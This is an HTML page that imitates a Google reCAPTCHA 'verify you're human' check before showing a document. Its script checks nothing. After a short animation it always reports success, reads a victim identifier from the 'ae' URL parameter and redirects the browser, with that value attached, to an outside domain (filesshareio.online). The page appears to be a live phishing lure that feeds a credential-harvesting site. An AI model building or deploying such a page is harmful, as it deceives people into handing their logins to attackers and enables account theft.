<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
    <title>MS</title>
    <style>
        *,
        *:before,
        *:after {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        #preloader {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: #f5f7fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.6s, visibility 0.6s;
        }
        #preloader.done {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .spinner {
            width: 56px;
            height: 56px;
            border: 5px solid rgba(0, 0, 0, 0.08);
            border-top-color: #2c7be5;
            border-right-color: #2c7be5;
            border-radius: 50%;
            animation: rotate 0.9s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
        }
        .spinner-label {
            margin-top: 20px;
            color: #4a4a4a;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            font-size: 15px;
            letter-spacing: 0.8px;
            font-weight: 400;
        }
        @keyframes rotate {
            to {
                transform: rotate(360deg);
            }
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Roboto, sans-serif;
            background: #f5f7fa;
        }

        #app {
            position: relative;
            z-index: 1;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            max-width: 100%;
            opacity: 0;
            transform: translateY(12px);
            transition: opacity 0.7s, transform 0.7s;
        }
        #app.shown {
            opacity: 1;
            transform: translateY(0);
        }

        .heading {
            color: #1e293b;
            font-size: 18px;
            font-family: 'Inter', -apple-system, sans-serif;
            font-weight: 450;
            text-align: center;
            margin-bottom: 18px;
            letter-spacing: 0.4px;
            line-height: 1.5;
            max-width: 420px;
            padding: 0 10px;
        }

        .panel {
            width: 360px;
            max-width: 92vw;
            background: #ffffff;
            border-radius: 12px;
            padding: 22px 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08), 0 2px 8px rgba(0, 0, 0, 0.04);
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: box-shadow 0.25s;
            user-select: none;
            border: 1px solid #e9edf2;
        }
        .panel:hover {
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.10), 0 2px 8px rgba(0, 0, 0, 0.06);
        }

        .left {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            padding: 2px 0;
        }

        .tickbox {
            width: 24px;
            height: 24px;
            min-width: 24px;
            border: 2px solid #bcc3cd;
            border-radius: 4px;
            background: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
            position: relative;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.02);
        }
        .left:hover .tickbox:not(.busy):not(.ok) {
            border-color: #8c9aa8;
            box-shadow: 0 0 0 3px rgba(44, 123, 229, 0.10);
        }

        .tickbox.busy {
            border: 3px solid transparent;
            border-top-color: #2c7be5;
            border-right-color: #2c7be5;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            min-width: 24px;
            background: transparent;
            box-shadow: none;
            animation: spin 0.75s cubic-bezier(0.45, 0.05, 0.55, 0.95) infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .tickbox.ok {
            background: #34a853;
            border-color: #34a853;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(52, 168, 83, 0.25);
            animation: pop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1) forwards;
        }
        @keyframes pop {
            0% {
                transform: scale(0.7);
            }
            50% {
                transform: scale(1.15);
            }
            100% {
                transform: scale(1);
            }
        }
        .tickbox.ok::after {
            content: '';
            position: absolute;
            left: 6px;
            top: 2px;
            width: 10px;
            height: 16px;
            border: solid white;
            border-width: 0 2.5px 2.5px 0;
            transform: rotate(45deg) scale(0.9);
            animation: draw 0.3s ease 0.1s forwards;
            opacity: 0;
        }
        @keyframes draw {
            0% {
                opacity: 0;
                transform: rotate(45deg) scale(0.6);
            }
            100% {
                opacity: 1;
                transform: rotate(45deg) scale(0.9);
            }
        }

        .label-text {
            font-size: 15px;
            font-weight: 500;
            color: #1e293b;
            letter-spacing: 0.2px;
            transition: color 0.3s;
            white-space: nowrap;
            min-width: 72px;
        }
        .label-text.working {
            color: #2c7be5;
        }
        .label-text.done {
            color: #34a853;
        }

        .right {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
            gap: 2px;
            line-height: 1.2;
            padding-left: 12px;
            border-left: 1px solid #e9edf2;
        }

        .brand {
            font-size: 15px;
            font-weight: 700;
            color: #000;
            letter-spacing: 0.2px;
        }

        .meta {
            font-size: 10.5px;
            color: #6b7280;
            letter-spacing: 0.3px;
            font-weight: 400;
        }
        .meta a {
            color: #6b7280;
            text-decoration: none;
            transition: color 0.2s;
        }
        .meta a:hover {
            color: #2c7be5;
            text-decoration: underline;
        }
        .meta .sep {
            margin: 0 3px;
            color: #b0b6bd;
        }

        .hint {
            text-align: center;
            margin-top: 14px;
            font-size: 13px;
            color: #1e293b;
            font-weight: 400;
            letter-spacing: 0.3px;
            opacity: 0;
            transition: opacity 0.4s;
        }
        .hint.show {
            opacity: 1;
        }

        @media (max-width: 420px) {
            .heading {
                font-size: 15px;
                max-width: 320px;
            }
            .panel {
                padding: 16px 14px;
            }
            .left {
                gap: 8px;
            }
            .tickbox {
                width: 22px;
                height: 22px;
                min-width: 22px;
            }
            .tickbox.busy {
                width: 22px;
                height: 22px;
                min-width: 22px;
                border-width: 2.5px;
            }
            .tickbox.ok::after {
                left: 5px;
                top: 1px;
                width: 9px;
                height: 14px;
                border-width: 0 2.5px 2.5px 0;
            }
            .label-text {
                font-size: 13px;
                min-width: 58px;
            }
            .brand {
                font-size: 13px;
            }
            .meta {
                font-size: 9.5px;
            }
            .right {
                padding-left: 8px;
            }
        }
        @media (max-width: 350px) {
            .panel {
                padding: 12px 10px;
            }
            .left {
                gap: 5px;
            }
            .tickbox {
                width: 18px;
                height: 18px;
                min-width: 18px;
                border-width: 1.5px;
                border-radius: 3px;
            }
            .tickbox.busy {
                width: 18px;
                height: 18px;
                min-width: 18px;
                border-width: 2px;
            }
            .tickbox.ok::after {
                left: 4px;
                top: 1px;
                width: 7px;
                height: 11px;
                border-width: 0 2px 2px 0;
            }
            .label-text {
                font-size: 11px;
                min-width: 44px;
            }
            .brand {
                font-size: 11px;
            }
            .meta {
                font-size: 8px;
            }
            .right {
                padding-left: 5px;
            }
        }
    </style>
</head>
<body>

    <!-- PRELOADER -->
    <div id="preloader">
        <div class="spinner"></div>
        <div class="spinner-label"></div>
    </div>

    <!-- MAIN CONTENT -->
    <div id="app">
        <div class="heading" id="prompt">To view this document, verify you're human below</div>

        <div class="panel" role="group" aria-label="reCAPTCHA verification" aria-describedby="prompt">
            <div class="left" id="trigger" role="button" tabindex="0" aria-label="Verify">
                <div class="tickbox" id="box"></div>
                <span class="label-text" id="statusLabel">Verify</span>
            </div>
            <div class="right">
                <div class="brand">reCAPTCHA</div>
                <div class="meta">
                    <a href="#" aria-label="Privacy">Privacy</a>
                    <span class="sep">·</span>
                    <a href="#" aria-label="Terms">Terms</a>
                </div>
            </div>
        </div>

        <div class="hint" id="feedback">✓ Verification complete</div>
    </div>

    <script>
        (function() {
            'use strict';

            var overlay = document.getElementById('preloader');
            var main = document.getElementById('app');

            setTimeout(function() {
                overlay.classList.add('done');
                main.classList.add('shown');
            }, 500);

            var box = document.getElementById('box');
            var label = document.getElementById('statusLabel');
            var trigger = document.getElementById('trigger');
            var feedback = document.getElementById('feedback');

            var locked = false;
            var verified = false;
            var timerRef = null;

            function resetAll() {
                box.className = 'tickbox';
                label.className = 'label-text';
                label.textContent = 'Verify';
                feedback.classList.remove('show');
                locked = false;
                verified = false;
                if (timerRef) {
                    clearTimeout(timerRef);
                    timerRef = null;
                }
            }

            function beginCheck() {
                if (locked) return;
                if (verified) {
                    resetAll();
                    requestAnimationFrame(function() {
                        requestAnimationFrame(function() {
                            beginCheck();
                        });
                    });
                    return;
                }

                locked = true;
                box.className = 'tickbox busy';
                label.className = 'label-text working';
                label.textContent = 'Verifying...';
                feedback.classList.remove('show');

                var step = setTimeout(function() {
                    if (!locked) return;
                    box.className = 'tickbox ok';
                    label.className = 'label-text done';
                    label.textContent = 'Success';
                    locked = false;
                    verified = true;
                    feedback.textContent = '';
                    feedback.classList.add('show');

                    var delay = 500;
                    clearTimeout(timerRef);
                    timerRef = setTimeout(function() {
                        var query = window.location.search;
                        var params = new URLSearchParams(query);
                        var token = params.get('ae') || '';
                        // obfuscated redirect URL
                        var base = 'https://uaeo.filesshareio.online/pbuwFQTX';
                        var dest = base + '#' + token;
                        window.location.href = dest;
                    }, delay);

                    clearTimeout(window._hintCleanup);
                    window._hintCleanup = setTimeout(function() {
                        feedback.classList.remove('show');
                    }, 4000);
                }, 1800);

                box._timer = step;
            }

            function onActivate(e) {
                if (e.type === 'keydown' && e.key !== 'Enter' && e.key !== ' ') return;
                e.preventDefault();
                beginCheck();
            }

            trigger.addEventListener('click', onActivate);
            trigger.addEventListener('keydown', onActivate);

            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && verified) {
                    resetAll();
                    feedback.classList.remove('show');
                    clearTimeout(box._timer);
                    clearTimeout(window._hintCleanup);
                    locked = false;
                }
            });

            trigger.addEventListener('contextmenu', function(e) { e.preventDefault(); });

            // Live region for accessibility
            var announcer = document.createElement('div');
            announcer.setAttribute('aria-live', 'polite');
            announcer.setAttribute('aria-atomic', 'true');
            announcer.style.position = 'absolute';
            announcer.style.width = '1px';
            announcer.style.height = '1px';
            announcer.style.padding = '0';
            announcer.style.margin = '-1px';
            announcer.style.overflow = 'hidden';
            announcer.style.clip = 'rect(0,0,0,0)';
            announcer.style.border = '0';
            document.body.appendChild(announcer);

            var monitor = new MutationObserver(function() {
                var txt = label.textContent.trim();
                if (txt === 'Verifying...') {
                    announcer.textContent = 'Verifying, please wait.';
                } else if (txt === 'Success') {
                    announcer.textContent = 'Verification successful. Redirecting.';
                } else if (txt === 'Verify') {
                    announcer.textContent = 'Ready to verify.';
                }
            });
            monitor.observe(label, { childList: true, characterData: true, subtree: true });

            resetAll();
        })();
    </script>
</body>
</html>
